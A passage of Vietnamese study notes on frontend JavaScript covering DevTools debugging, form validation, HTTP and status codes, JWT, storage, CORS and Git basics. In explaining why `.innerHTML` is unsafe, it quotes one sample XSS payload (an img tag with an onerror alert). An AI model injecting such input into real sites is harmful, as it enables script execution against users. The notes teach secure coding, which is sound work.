  - **`F10` (Step Over - Bước qua):** Cho máy chạy dòng code hiện tại và bước sang dòng tiếp theo trong cùng hàm. Nếu dòng hiện tại có gọi một hàm con khác, nó sẽ tự động chạy xong hàm con đó trong hậu trường mà không chui vào ruột hàm con.
  - **`F11` (Step Into - Chui vào trong) / Icon mũi tên chỉ xuống `↓`:**
    - Cho phép máy chui sâu vào tận bên trong ruột của hàm con ở dòng hiện tại để xem chi tiết từng dòng code nhỏ bên trong hàm đó chạy ra sao.
    - *Lưu ý sống còn trên máy Mac (macOS):* Phím `F11` mặc định của macOS bị gán cho tính năng hệ thống là "Show Desktop" (Ẩn hết cửa sổ để hiện màn hình chính). Vì vậy, người dùng Mac phải bấm tổ hợp **`Fn + F11`**, HOẶC dùng chuột click trực tiếp vào biểu tượng mũi tên chỉ xuống `↓` trên thanh công cụ Debug của trình duyệt.
  - **`Shift + F11` (Step Out - Nhảy vọt ra ngoài):** Sau khi đã xem đủ bên trong ruột hàm con, bấm phím này để máy tự chạy hết phần còn lại của hàm con đó và nhảy vọt trở lại vị trí hàm cha bên ngoài.
  - **`F8` (Resume - Thả phanh):** Thả tự do cho chương trình tiếp tục chạy với tốc độ bình thường cho đến khi nó đụng phải một Breakpoint kế tiếp (hoặc chạy hết code nếu không còn điểm dừng nào).
- **3 Tab theo dõi bộ nhớ thần thánh trong lúc đóng băng:**
  1. **Tab `Scope` (Kính hiển vi soi biến trong RAM):**
     - Hiển thị danh sách tất cả các biến đang tồn tại trong bộ nhớ tại đúng dòng bạn đang dừng:
     - *Local:* Các biến nội bộ được khai báo bên trong hàm hiện tại.
     - *Closure:* Các biến của hàm cha mà hàm hiện tại đang "bắt giữ" và ghi nhớ.
     - *Global / Script:* Các biến toàn cục (`window`).
  2. **Tab `Watch` (Bảng đồng hồ theo dõi biểu thức):**
     - Cho phép bạn bấm dấu `+` và gõ bất kỳ biểu thức tính toán nào bạn muốn theo dõi liên tục (ví dụ: `totalPrice`, `items.length > 0`, `user.isVip`). Giá trị này sẽ tự động nhảy số cập nhật sau mỗi lần bạn bấm `F10`.
  3. **Tab `Call Stack` (Ngăn xếp các hàm đang lồng nhau):**
     - Liệt kê cây phả hệ các hàm đang triệu hồi nhau. Bạn có thể click chuột vào từng tầng hàm trong danh sách Call Stack để xem lại quá khứ của các biến ở các hàm cha cấp cao hơn.

---

### 5. Sử dụng thành thạo các panel trong Chrome DevTools:
- **1. Panel `Elements` (Soi cấu trúc giao diện và CSS):**
  - Cho phép soi trực tiếp cây DOM thực tế đang hiển thị trên trình duyệt (khác với mã HTML tĩnh ban đầu do JavaScript có thể đã thêm bớt thẻ).
  - Soi và sửa trực tiếp mã CSS ở tab con *Styles* để xem thử giao diện đổi màu/kích thước ngay lập tức mà không cần lưu file.
  - Tab con *Computed*: Xem các kích thước thật (Padding, Margin, Border, Width, Height) đã được trình duyệt tính toán ra số pixel cuối cùng.
  - Giả lập trạng thái tương tác: Bấm nút `:hov` để ép một phần tử bật trạng thái `:hover`, `:active`, `:focus` phục vụ việc căn chỉnh giao diện.
- **2. Panel `Console` (Bảng điều khiển tương tác):**
  - Hiển thị mọi thông báo `console.log()`, cảnh báo vàng `console.warn()`, và thông báo sập lỗi đỏ `console.error()`.
  - Đóng vai trò như một môi trường chạy code trực tiếp (REPL): Bạn có thể gõ bất kỳ biến hoặc lệnh JavaScript nào và nhấn `Enter` để kiểm tra kết quả ngay tại chỗ.
- **3. Panel `Sources` (Trung tâm gỡ lỗi và quản lý mã nguồn):**
  - Chứa toàn bộ cây thư mục các file HTML, CSS, JS mà trang web đã tải về máy bạn.
  - Nơi chính yếu để thực hiện kỹ thuật Debug: Đặt Breakpoint, đặt Conditional Breakpoint, xem Scope, Watch và Call Stack.
- **4. Panel `Network` (Trạm radar giám sát lưu lượng giao tiếp máy chủ):**
  - Ghi lại từng gói tin mà trình duyệt gửi đi và nhận về qua Internet (API, hình ảnh, file CSS, file JS).
  - *Bộ lọc tiện dụng:* Bấm nút **Fetch/XHR** để chỉ hiển thị riêng các cuộc gọi API lấy dữ liệu.
  - *4 Tab soi chi tiết của một cuộc gọi API:*
    - Tab *Headers:* Soi địa chỉ URL gọi đi, phương thức HTTP (`GET`, `POST`), mã phản hồi (*Status Code* như 200, 404, 500), và Token xác thực.
    - Tab *Payload:* Soi dữ liệu mà trình duyệt vừa đóng gói gửi lên máy chủ (đặc biệt quan trọng với API tạo mới/cập nhật dữ liệu).
    - Tab *Response / Preview:* Soi dữ liệu dạng chuỗi JSON do Server gửi ngược về máy bạn để render ra giao diện.
    - Tab *Timing:* Bảng phân tích thời gian từng mili-giây (thời gian kết nối, thời gian chờ Server xử lý TTFB - Time to First Byte) giúp phát hiện API nào chạy chậm chạp.
  - *Tùy chọn Preserve log:* Tích vào ô này để DevTools không bị xóa sạch lịch sử mạng khi trang web vô tình bị tải lại (Reload).
- **5. Panel `Application / Storage` (Kho lưu trữ dữ liệu phía trình duyệt):**
  - Quản lý toàn bộ dữ liệu Client-side Storage của trang web:
    - **`Local Storage`:** Dữ liệu lưu vĩnh viễn trên máy người dùng, tắt trình duyệt bật lại vẫn còn (thường lưu Theme tối/sáng, cài đặt cá nhân).
    - **`Session Storage`:** Dữ liệu chỉ tồn tại trong phiên làm việc của tab hiện tại, đóng tab là mất sạch.
    - **`Cookies`:** Các chuỗi dữ liệu nhỏ do Server gửi kèm để quản lý phiên đăng nhập (Session ID, JWT Token).
  - Cho phép lập trình viên soi giá trị các Key - Value, chỉnh sửa trực tiếp, hoặc bấm icon thùng rác để xóa trắng nhằm kiểm tra trạng thái trang web khi người dùng chưa đăng nhập.

---

### 6. Phân biệt rõ: Lỗi cú pháp (Syntax error), Lỗi khi chạy (Runtime error), và Lỗi nghiệp vụ (Logic bug):
- **Bảng so sánh tổng hợp 3 cấp độ lỗi:**

| Đặc điểm phân biệt | 1. Lỗi Cú pháp (Syntax Error) | 2. Lỗi Khi Chạy (Runtime Error) | 3. Lỗi Nghiệp vụ (Logic Bug) |
| :--- | :--- | :--- | :--- |
| **Bản chất đời thường** | "Nói ngọng, viết sai chính tả, sai ngữ pháp" | "Đang chạy bộ trên đường bằng phẳng thì vấp phải hòn đá ngã gãy chân" | "Bảo đi chợ mua rau cải thì lại đi mua nhầm chai dầu hỏa mang về" |
| **Thời điểm phát hiện** | **Trước khi code chạy** (Lúc trình phân tích Parser quét file mã nguồn). | **Trong lúc code đang chạy** (Vừa gặp phải dữ liệu hoặc tình huống bất thường). | **Code chạy xong xuôi mượt mà** nhưng kết quả đầu ra bị sai lệch. |
| **Dấu hiệu nhận biết** | VS Code gạch chân đỏ lòe ngay khi đang gõ; Console in lỗi đỏ `SyntaxError` và **không chạy bất kỳ dòng code nào trong file**. | Code chạy được nửa chừng thì đột ngột khựng lại, Console bắn ra lỗi đỏ (`TypeError`, `ReferenceError`). | **Console hoàn toàn sạch bóng, không có bất kỳ dòng chữ đỏ nào!** Ứng dụng chạy rất trơn tru nhưng dữ liệu hiển thị bị sai. |
| **Ví dụ kinh điển** | Viết thiếu ngoặc nhọn `if (x > 0 {`, đặt tên biến sai quy tắc `let 123name;`. | Đọc thuộc tính của biến `null`/`undefined` (`user.name`), mất mạng khi fetch API. | Tính tiền giảm giá đáng lẽ phải trừ tiền thì viết nhầm dấu `+` làm khách bị cộng thêm tiền: `total = price + discount;`. |
| **Mức độ nguy hiểm** | **Thấp nhất:** Dễ phát hiện nhất và sửa nhanh nhất vì máy chỉ đích danh dòng sai. | **Trung bình:** Làm sập màn hình của người dùng. Có thể phòng ngừa bằng `try...catch` và toán tử an toàn `?.`. | **CỰC KỲ NGUY HIỂM (Cơn ác mộng số 1)!** Máy móc không biết là bạn viết sai ý muốn, chỉ có con người phát hiện khi khách hàng khiếu nại mất tiền. |
| **Vũ khí giải quyết** | Trình biên dịch / Linter (ESLint), đọc kỹ số dòng báo lỗi của Parser. | Bọc `try...catch`, kiểm tra điều kiện phòng vệ trước (`if (!user) return;`), Optional Chaining `user?.name`. | **Bắt buộc phải dùng công cụ Debugger** (đặt Breakpoint, bấm F10 theo dõi từng biến) hoặc viết các bài kiểm thử tự động (Unit Test). |

---
---

## 11. Form và validation (Xử lý Form & Kiểm định dữ liệu)

---

### 1. Đọc và chuẩn hóa dữ liệu từ form (`FormData`, `input.value.trim()`):
- **Định nghĩa & Cơ chế ngầm của thẻ `<form>`:**
  - *Hành vi mặc định sơ khai (1990s):* Khi bấm `<button type="submit">`, trình duyệt tự động gom các input và nạp lại toàn bộ trang web (Full Page Reload) để gửi HTTP request lên địa chỉ ở thuộc tính `action`.
  - *Hậu quả trong Web hiện đại / React:* Reload trang sẽ **xóa sạch 100% bộ nhớ RAM của JavaScript** (State, biến, giỏ hàng).
  - *Cần phanh khẩn cấp:* Lệnh **`e.preventDefault()`** trong hàm lắng nghe sự kiện `submit` ra lệnh cho trình duyệt triệt tiêu hành vi reload mặc định, trao toàn quyền kiểm soát cho JavaScript (`fetch()` / AJAX).
- **Vũ khí bốc trọn gói dữ liệu: `new FormData(formElement)`:**
  - `FormData` là một Web API Interface chuyên dụng đại diện cho gói dữ liệu `multipart/form-data`.
  - *Cách dùng 1 dòng biến thành Object JS:*
    ```javascript
    const data = Object.fromEntries(new FormData(form));
    // -> { username: "thinh", email: "thinh@gmail.com" }
    ```
  - *Phương thức quan trọng:*
    - `formData.get("name")`: Lấy giá trị của 1 trường đầu tiên.
    - `formData.getAll("hobby")`: Dành riêng cho nhóm Checkbox trùng tên `name="hobby"`, trả về một Mảng chứa đủ mọi giá trị người dùng đã tích chọn (`["Đá bóng", "Bơi lội"]`).
- **Bẫy tử huyệt số 1 của `FormData` (Hiện trường vụ án):**
  - Để `FormData` có thể đọc được dữ liệu của một ô `<input>`, thẻ đó **BẮT BUỘC PHẢI CÓ THUỘC TÍNH `name`** (`<input name="email" id="email" />`). Nếu chỉ đặt `id` mà quên `name`, `FormData` hoàn toàn coi ô đó "tàng hình" và trả về rỗng!
- **Chuẩn hóa với `.trim()` & Bản chất luôn là String:**
  - **MỌI giá trị lấy từ ô `<input>` đều có kiểu dữ liệu là STRING**, kể cả `<input type="number">` hay `type="date"`. Nếu lấy tuổi cộng thêm 5: `"25" + 5 = "255"` (nối chuỗi tai hại). Luôn phải ép kiểu số bằng `Number(val)`.
  - `input.value.trim()`: Cắt bỏ khoảng trắng thừa ở 2 đầu chuỗi, giữ nguyên dấu cách hợp lệ ở giữa các từ trong họ tên (`"   Nguyễn Văn Thịnh   "` -> `"Nguyễn Văn Thịnh"`).

---

### 2. Validate các trường hợp phổ biến (Required, Min/Max Length, Number, Email Regex):
- **1. Bắt buộc (Required):**
  - Kiểm tra xem người dùng có bỏ trống hoặc cố tình chỉ gõ toàn dấu cách:
    ```javascript
    if (!value.trim()) {
      // Báo lỗi: "Không được để trống!"
    }
    ```
- **2. Độ dài ký tự (Min / Max Length):**
  - Dùng thuộc tính `.length` của chuỗi để kiểm tra mật khẩu, tên đăng nhập:
    ```javascript
    if (password.length < 6 || password.length > 32) {
      // Báo lỗi: "Mật khẩu phải từ 6 đến 32 ký tự!"
    }
    ```
- **3. Số hợp lệ và Giới hạn khoảng (Number & Range):**
  - Ép kiểu bằng `Number(value)` và bắt buộc kiểm tra xem có bị biến thành số ma `NaN` bằng hàm `Number.isNaN()`:
    ```javascript
    const ageNum = Number(ageInput.value);
    if (Number.isNaN(ageNum) || ageNum < 18 || ageNum > 100) {
      // Báo lỗi: "Tuổi phải là số nguyên từ 18 đến 100!"
    }
    ```
- **4. Định dạng Email chuẩn với Regular Expression (Regex):**
  - Mẫu Regex chuẩn hóa an toàn: `/^[^\s@]+@[^\s@]+\.[^\s@]+$/`
    - `^`: Bắt đầu chuỗi.
    - `[^\s@]+`: Ít nhất 1 ký tự không phải khoảng trắng và không phải `@`.
    - `@`: Bắt buộc có đúng 1 ký tự `@`.
    - `[^\s@]+`: Tên miền (Domain).
    - `\.`: Dấu chấm ngăn cách tên miền (`.com`, `.vn`).
    - `[^\s@]+$`: Đuôi mở rộng và kết thúc chuỗi.
  - *Cách kiểm tra:* `if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { /* Báo lỗi email sai định dạng */ }`

---

### 3. Hiển thị thông báo lỗi đúng ngay dưới field tương ứng:
- **Cấu trúc HTML tiêu chuẩn cho Form Group:**
  ```html
  <div class="form-group">
    <label for="email">Địa chỉ Email</label>
    <input type="text" id="email" name="email" />
    <span class="error-msg" id="email-error"></span>
  </div>
  ```
- **So sánh 3 thuộc tính hiển thị text và Bẫy bảo mật XSS:**
  - ❌ **Cấm dùng `.innerHTML`:** Nếu thông báo lỗi chứa chuỗi do người dùng nhập (ví dụ: `emailError.innerHTML = 'Email ' + inputVal + ' không hợp lệ'`), hacker có thể nhập mã độc `<img src=x onerror=alert('Hack')>` dẫn đến lỗ hổng nghiêm trọng **XSS (Cross-Site Scripting)**.
  - ⚠️ **Hạn chế dùng `.innerText`:** Chậm hơn vì kích hoạt trình duyệt tính toán lại giao diện (Reflow / Layout) để kiểm tra CSS ẩn hiện.
  - ✅ **Chuẩn Senior dùng `.textContent`:** Vừa an toàn tuyệt đối (luôn coi mọi thứ là chuỗi chữ thuần túy, không thực thi HTML), vừa có tốc độ thao tác DOM nhanh nhất.

---

### 4. Chặn form submit khi dữ liệu không hợp lệ (Mô hình cờ `isValid`):
- **Quy trình 3 bước xử lý lỗi chuẩn:**
  1. *Bước 1 (Dọn dẹp trước):* Xóa sạch toàn bộ thông báo lỗi đỏ cũ của các lần bấm trước (`errorSpan.textContent = ""`).
  2. *Bước 2 (Kiểm tra & Gán lỗi):* Dùng một biến cờ `let isValid = true;`. Duyệt qua từng ô input, nếu ô nào vi phạm thì gán thông báo lỗi vào `textContent` của ô đó và đánh dấu `isValid = false;`.
  3. *Bước 3 (Bóp phanh Early Return):*
     ```javascript
     if (!isValid) {
       return; // DỪNG LẠI NGAY LẬP TỨC! Không cho phép chạy dòng code gọi API phía dưới!
     }
     ```

---

### 5. Chuẩn hóa dữ liệu trước khi gửi đi (Sanitize, Trim whitespace, Ép kiểu):
- Trước khi đóng gói gửi lên máy chủ hoặc lưu Database, dữ liệu người dùng thô cần được "gọt giũa sạch sẽ":
  1. **Trim khoảng trắng ở 2 đầu:** `email.trim().toLowerCase()` (đưa email về chữ thường để tránh phân biệt hoa thường khi đăng nhập).
  2. **Dọn sạch dấu cách kép ở giữa họ tên:** `fullName.trim().replace(/\s+/g, " ")`.
  3. **Ép kiểu dữ liệu rõ ràng:** Chuyển các trường số lượng, giá tiền, ID từ String về đúng kiểu Number (`Number(quantity)`).

---

### 6. Reset form sau khi submit thành công (`form.reset()`):
- **Bản chất của `form.reset()`:**
  - Là phương thức có sẵn của đối tượng `HTMLFormElement` trong DOM.
  - Khi được gọi: `form.reset();`, trình duyệt tự động dọn sạch tất cả các ô `<input>`, `<textarea>`, và chuyển các checkbox/radio về trạng thái ban đầu của mã HTML mà **không cần phải gán thủ công từng dòng `input.value = ""`**.
  - Luôn được gọi sau khi API gửi dữ liệu thành công để trả giao diện về trạng thái sẵn sàng cho lượt nhập mới.

---

### 7. Tránh submit nhiều lần (Double-click submit / Bấm liên tiếp):
- **Hậu quả tai hại:** Khi mạng bị lag, người dùng sốt ruột bấm nút Submit 4 lần liên tiếp -> Gửi 4 request cùng lúc lên máy chủ -> Trừ tiền 4 lần hoặc tạo ra 4 đơn hàng trùng lặp trên Database.
- **Giải pháp chuẩn kết hợp thuộc tính `disabled` và khối `finally`:**
  ```javascript
  const submitBtn = form.querySelector("button[type='submit']");

  try {
    // 1. NGAY LẬP TỨC VÔ HIỆU HÓA NÚT BẤM VÀ ĐỔI GIAO DIỆN:
    submitBtn.disabled = true;
    submitBtn.textContent = "Đang xử lý đơn hàng...";

    // 2. Gọi API bất đồng bộ:
    await guiDonHangLenServer(payload);
    alert("Thành công!");
    form.reset();

  } catch (error) {
    alert("Có sự cố mạng, vui lòng thử lại!");
  } finally {
    // 3. BẮT BUỘC MỞ LẠI NÚT DÙ THÀNH CÔNG HAY THẤT BẠI:
    // (Tránh trường hợp bị lỗi mạng mà nút bấm bị xám xịt vĩnh viễn, người dùng không thể bấm gửi lại)
    submitBtn.disabled = false;
    submitBtn.textContent = "Gửi đơn hàng";
  }
  ```

---

### 🔗 KẾT NỐI VỚI REACT (Tiền đề sống còn):
1. **Controlled Components vs Uncontrolled Components:**
   - *Uncontrolled Components:* Sử dụng đúng bản chất của Vanilla JS (dùng `new FormData(e.target)` hoặc `useRef()` để khi nào bấm Submit mới đọc dữ liệu một lần).
   - *Controlled Components:* Mỗi ô input được liên kết chặt chẽ với một State trong React: `value={email}` và `onChange={(e) => setEmail(e.target.value)}`. Mỗi phím gõ của người dùng đều kích hoạt component re-render.
2. **Thư viện Form thực chiến trong React:**
   - Sau này khi đi làm dự án React lớn, bạn sẽ không viết validate thủ công bằng tay nữa mà sử dụng thư viện **React Hook Form** hoặc **Formik** kết hợp với thư viện định nghĩa luật kiểm tra **Zod** / **Yup**. 
   - Tuy nhiên, toàn bộ tư duy về `e.preventDefault()`, `name` attribute, Regex email, `disabled` trạng thái `isSubmitting`, và reset form đều bắt nguồn 100% từ nền tảng Vanilla JS trên!

---
---

## 12. Kiến thức trình duyệt và API (Browser APIs & HTTP Architecture)

---

### 1. Kiến trúc HTTP cơ bản: `GET`, `POST`, `PUT / PATCH`, `DELETE`:
- **Định nghĩa các động từ HTTP (HTTP Methods / Verbs):**
  - **`GET`:** Lấy dữ liệu từ máy chủ về. Tuyệt đối không làm thay đổi trạng thái dữ liệu trên máy chủ (Idempotent & Safe). Không có phần Body dữ liệu gửi kèm.
  - **`POST`:** Tạo mới một tài nguyên (Tạo tài khoản, đăng bình luận, gửi đơn hàng). Mỗi lần gọi `POST` thành công thường sinh ra một bản ghi mới với ID mới.
  - **`DELETE`:** Xóa tài nguyên trên máy chủ theo ID chỉ định.
- **Cuộc chiến `PUT` vs `PATCH` (Thay mới hoàn toàn vs Chắp vá từng phần):**
  - **`PUT` (Replace Entirely - Đổi cả chiếc xe):**
    - Mang ý nghĩa thay thế toàn bộ bản ghi. Nếu bản ghi có 10 trường mà bạn chỉ gửi lên `{ isWatched: true }`, theo đúng chuẩn RESTful, Server sẽ ghi đè trắng và 9 trường còn lại sẽ bị biến thành `null` hoặc xóa sổ!
  - **`PATCH` (Partial Modification - Vá săm xe / Thay linh kiện):**
    - Mang ý nghĩa cập nhật từng phần. Bạn muốn sửa 1 trường hay 5 trường đều được, Server **chỉ cập nhật đúng những trường bạn gửi lên** và bảo toàn nguyên vẹn tất cả các trường dữ liệu khác.

---

### 2. Chu trình Request / Response (Vòng đời yêu cầu - phản hồi):
- **Cấu trúc của gói tin gửi đi (HTTP Request):**
  1. *Request Line:* Phương thức (`GET`, `POST`) + Đường dẫn URL (`/api/movies`) + Phiên bản HTTP (`HTTP/1.1` hoặc `HTTP/2`).
  2. *Headers:* Các thông tin siêu dữ liệu (Metadata) như `Content-Type: application/json`, `Authorization: Bearer <token>`, `User-Agent`.
  3. *Body (Payload):* Dữ liệu dạng chuỗi JSON hoặc FormData gửi lên (chỉ có ở `POST`, `PUT`, `PATCH`).
- **Cấu trúc của gói tin nhận về (HTTP Response):**
  1. *Status Line:* Mã trạng thái phản hồi (*Status Code* như 200, 404, 500) kèm thông điệp ngắn (*Status Text* như `OK`, `Not Found`).
  2. *Response Headers:* Máy chủ phản hồi kiểu dữ liệu (`Content-Type: application/json`), độ dài gói tin, cấu hình Cookie (`Set-Cookie`).
  3. *Response Body:* Dữ liệu thực tế gửi về cho Frontend render (thường là chuỗi JSON).

---

### 3. Định dạng JSON (`JSON.stringify()` và `JSON.parse()`):
- **Bản chất của JSON (JavaScript Object Notation):**
  - Là định dạng văn bản thuần túy (Plain Text) độc lập với mọi ngôn ngữ lập trình, dùng làm chuẩn chung để truyền dữ liệu qua mạng Internet.
- **Phân biệt `String(obj)` vs `JSON.stringify(obj)` & Bẫy `"[object Object]"`:**
  - *Ép kiểu String thường (`String(obj)` hoặc `obj.toString()`):* Chỉ in ra nhãn định danh kiểu dữ liệu `"[object Object]"`, vứt bỏ toàn bộ key-value bên trong, không thể khôi phục lại dữ liệu!
  - *Đóng gói tuần tự hóa (`JSON.stringify(obj)`):* Soi từng thuộc tính và chuyển hóa toàn bộ cấu trúc Object/Array thành chuỗi văn bản có cấu trúc: `'{"name":"Thịnh","age":25}'`.
  - *Giải nén phục hồi (`JSON.parse(str)`):* Đọc chuỗi văn bản JSON và tái tạo lại thành Object/Array sống động trong bộ nhớ RAM của JavaScript.
  - 💥 **Bẫy sập Runtime:** `JSON.parse()` sẽ quăng lỗi đỏ sập ứng dụng `SyntaxError: Unexpected token` nếu chuỗi truyền vào không đúng chuẩn JSON (ví dụ chuỗi bị `undefined` hoặc HTML lỗi 500). Luôn bọc trong `try...catch` khi parse dữ liệu rủi ro!

---

### 4. Ý nghĩa các dải HTTP Status Code cần thuộc nằm lòng:
- **Dải 2xx (Thành công - Success):**
  - `200 OK`: Yêu cầu thành công rực rỡ, trả về dữ liệu bình thường.
  - `201 Created`: Tạo mới tài nguyên thành công (thường trả về sau lệnh `POST` tạo tài khoản, tạo bài viết).
  - `204 No Content`: Thao tác thành công nhưng không có dữ liệu trả về (thường dùng cho `DELETE`).
- **Dải 4xx (Lỗi do phía Client / Frontend gửi sai):**
  - `400 Bad Request`: Dữ liệu gửi lên không đúng định dạng (thiếu trường bắt buộc, sai cú pháp).
  - `401 Unauthorized` *(Thực chất là Unauthenticated - Chưa xác thực)*: Người dùng chưa đăng nhập, chưa gửi Token hoặc Token đã hết hạn.
  - `403 Forbidden` *(Thực chất là Unauthorized - Không có quyền)*: Đã đăng nhập thành công, nhưng tài khoản không có quyền hạn truy cập vào tài nguyên này (Ví dụ: Member đòi xóa dữ liệu Admin).
  - `404 Not Found`: Đường link hoặc ID tài nguyên không tồn tại trên máy chủ.
  - `409 Conflict`: Xung đột dữ liệu (Ví dụ: Đăng ký tài khoản với email đã tồn tại trong Database).
- **Dải 5xx (Lỗi do phía Server sập):**
  - `500 Internal Server Error`: Code máy chủ bị crash (lỗi code Backend, chết Database).
  - `502 Bad Gateway`: Máy chủ Proxy / Nginx không kết nối được tới server ứng dụng.
  - `503 Service Unavailable`: Máy chủ đang quá tải hoặc đang bảo trì.

---

### 5. Phân biệt Query params (`?page=1&limit=10`) và Path params (`/products/:id`):
- **Path Params (Tham số đường dẫn):**
  - Nằm trực tiếp trong đường dẫn, ngăn cách bởi `/`.
  - *Mục đích:* **Định danh chính xác duy nhất 1 tài nguyên** (Resource Identifier).
  - *Ví dụ:* `/movies/avatar-2` hoặc `/users/12345`. Mang tính bắt buộc để xác định đối tượng cần xem.
- **Query Params (Tham số truy vấn):**
  - Bắt đầu sau dấu `?`, phân tách các cặp `key=value` bởi dấu `&`.
  - *Mục đích:* Dùng để **Lọc (Filter), Tìm kiếm (Search), Phân trang (Paging), và Sắp xếp (Sorting)** trên một danh sách.
  - *Ví dụ:* `/movies?genre=action&year=2024&page=2`. Mang tính tùy chọn (Optional).

---

### 6. Request Header và cơ chế xác thực Token (JWT & Bearer Token):
- **Ý nghĩa chữ `Bearer`:** Xuất phát từ "to bear" (người mang/cầm chiếc vé). Mang ý nghĩa *"Ai cầm chiếc vé hợp lệ trên tay thì người đó được vào cổng"*.
  - Định dạng Header: `Authorization: Bearer <chuoi_jwt_token>`
- **Giải phẫu cấu trúc 3 phần của JWT (`Header.Payload.Signature`):**
  1. *Header:* Chứa thuật toán ký (`{"alg":"HS256"}`), mã hóa Base64Url.
  2. *Payload:* Chứa dữ liệu user (`userId`, `role`, `exp`), mã hóa Base64Url.
     - 💥 *Lưu ý sống còn:* Base64Url KHÔNG PHẢI LÀ MÃ HÓA BẢO MẬT. Bất kỳ ai cũng đọc được Payload trên `jwt.io` -> Cấm tiệt lưu Password/Số thẻ vào đây!
  3. *Signature (Chữ ký điện tử):* Trộn `Header + "." + Payload` với `SECRET_KEY` bí mật của Server thông qua thuật toán HMAC-SHA256 để chống giả mạo dữ liệu.
- **Cặp bài trùng `Access Token` vs `Refresh Token` & Kỹ thuật Token Rotation:**
  - `Access Token`: Sống ngắn (15 phút), dùng để gọi API thường xuyên.
  - `Refresh Token`: Sống dài (7 đến 30 ngày), dùng để "chờ đợi" người dùng trong lúc họ tắt máy tính đi ngủ hoặc nghỉ ngơi. Khi mở máy lại, Frontend dùng Refresh Token xin cấp Access Token mới mà không bắt người dùng gõ lại mật khẩu.
  - *Token Rotation (Xoay vòng):* Mỗi lần dùng Refresh Token cũ, Server lập tức hủy bỏ nó và cấp Refresh Token mới toanh. Nếu phát hiện một token cũ bị dùng lại lần 2 -> Cảnh báo tài khoản bị lộ -> Hủy toàn bộ phiên đăng nhập trên toàn cầu ngay lập tức.

---

### 7. Lưu trữ phía client: `localStorage` (vĩnh viễn) vs `sessionStorage` (theo phiên tab):
- **So sánh vòng đời (Lifecycle):**
  - `localStorage`: Lưu trữ dữ liệu vĩnh viễn không thời hạn. Đóng tab, tắt trình duyệt, khởi động lại máy tính bật lên vẫn còn nguyên. Chỉ biến mất khi người dùng xóa cache hoặc code gọi `localStorage.clear()`.
  - `sessionStorage`: Chỉ tồn tại trong phiên làm việc của **duy nhất tab hiện tại**. Mở 2 tab cùng 1 trang web thì dữ liệu hoàn toàn độc lập. Đóng tab đó lại là dữ liệu bị xóa sạch sẽ 100%.
- **Bàn tròn bảo mật: Lưu Token ở đâu?**
  - `localStorage`: Dễ dùng, nhưng dễ bị tấn công đánh cắp bởi mã độc **XSS** (Cross-Site Scripting) thông qua `localStorage.getItem()`.
  - `httpOnly Cookie`: An toàn nhất vì JavaScript bị cấm tiệt không được phép đọc. Trình duyệt tự động gửi kèm Cookie lên Server, miễn nhiễm hoàn toàn với XSS.

---

### 8. Hiểu khái niệm cơ bản về CORS (Cross-Origin Resource Sharing):
- **Cơ chế Same-Origin Policy (Chính sách cùng nguồn):**
  - Một nguồn (Origin) được xác định bởi: **Giao thức (Protocol) + Tên miền (Domain) + Cổng (Port)**. Khác bất kỳ 1 trong 3 yếu tố này đều bị coi là Khác nguồn (Cross-Origin).
- **Tại sao Postman gọi được mà Trình duyệt lại báo lỗi đỏ CORS?**
  - CORS là **cơ chế bảo vệ người dùng do TRÌNH DUYỆT chủ động thực thi**, nhằm ngăn chặn các trang web độc hại tự ý gửi request có kèm cookie cá nhân của bạn đến các trang web khác.
  - Postman không phải trình duyệt nên không áp dụng chính sách CORS.
- **Cách khắc phục chuẩn:**
  - Phía Backend phải gửi kèm Header cho phép: `Access-Control-Allow-Origin: *` hoặc chỉ định đúng tên miền Frontend `http://localhost:3000`.
  - Phía Frontend (trong môi trường phát triển): Thiết lập **Dev Proxy** trong `vite.config.js` để gửi gián tiếp qua server nội bộ nhằm đánh lừa trình duyệt.

---

### 9. Tải file lên server bằng `FormData` và `FileReader` / `URL.createObjectURL`:
- **Xem trước ảnh (Preview) tức thì:**
  - *Cách 1 (Khuyên dùng - Siêu nhanh):*
    ```javascript
    const blobUrl = URL.createObjectURL(file); // Tạo link ảo trỏ vào RAM
    previewImg.src = blobUrl;
    ```
  - *Cách 2 (Truyền thống):* Dùng `FileReader` đọc ra chuỗi Base64: `reader.readAsDataURL(file)`.
- **Đóng gói tải file lên Server:**
  ```javascript
  const formData = new FormData();
  formData.append("avatar", file);

  fetch("/api/upload", {
    method: "POST",
    body: formData // ⚠️ CẤM tự ý set header Content-Type! Trình duyệt sẽ tự động thêm multipart/form-data kèm boundary chuẩn xác!
  });
  ```

---
---

## 13. Git và cấu trúc code (Git Workflow & Code Architecture)

---

### 1. Các lệnh Git hàng ngày (`clone`, `branch`, `add`, `commit`, `push`, `pull`):
- **Bản chất của Git:**
  - Git là hệ thống quản lý phiên bản phân tán (Distributed Version Control System). Mỗi máy tính cá nhân đều lưu trữ trọn vẹn toàn bộ lịch sử của dự án.
- **Quy trình làm việc hàng ngày (Daily Git Workflow):**
  1. `git clone <url>`: Sao chép toàn bộ kho mã nguồn từ máy chủ đám mây (GitHub, GitLab) về máy tính cá nhân để bắt đầu làm việc.
  2. `git checkout -b feat/ten-tinh-nang` (hoặc `git switch -c`): Tạo và nhảy ngay sang một nhánh độc lập để code tính năng mới, tuyệt đối không code chung trên nhánh gốc.
  3. `git status`: Soi xem những file nào vừa được thêm mới, sửa đổi hoặc xóa bỏ.
  4. `git add <ten-file>` (hoặc `git add .`): Đưa các thay đổi vào **Staging Area** (khu vực đóng gói chuẩn bị chụp ảnh).
  5. `git commit -m "feat: mô tả súc tích"`: Đóng dấu một bức ảnh chụp (Snapshot) lưu vết vào lịch sử cục bộ.
     - *Chuẩn mực viết commit (Conventional Commits):*
       - `feat:` Thêm tính năng mới (ví dụ: `feat: add movie search dropdown`).
       - `fix:` Sửa lỗi (ví dụ: `fix: handle empty search keyword`).
       - `refactor:` Tối ưu hóa/dọn dẹp code mà không làm thay đổi hành vi giao diện.
       - `docs:` Viết tài liệu ghi chú hoặc README.
       - `style:` Chỉnh sửa khoảng trắng, CSS, format code.
  6. `git push origin feat/ten-tinh-nang`: Đẩy nhánh tính năng từ máy cá nhân lên GitHub để sẵn sàng tạo Pull Request.
  7. `git pull origin develop`: Kéo các đoạn code mới nhất của đồng nghiệp từ nhánh `develop` về máy mình để gộp và kiểm tra tính tương thích.
- **Phân biệt `git fetch` vs `git pull`:**
  - `git fetch`: Giống như đi ra hòm thư xem có thư mới hay không. Tải dữ liệu về để máy biết có commit mới, nhưng **hoàn toàn không đụng chạm gì vào code bạn đang gõ**.
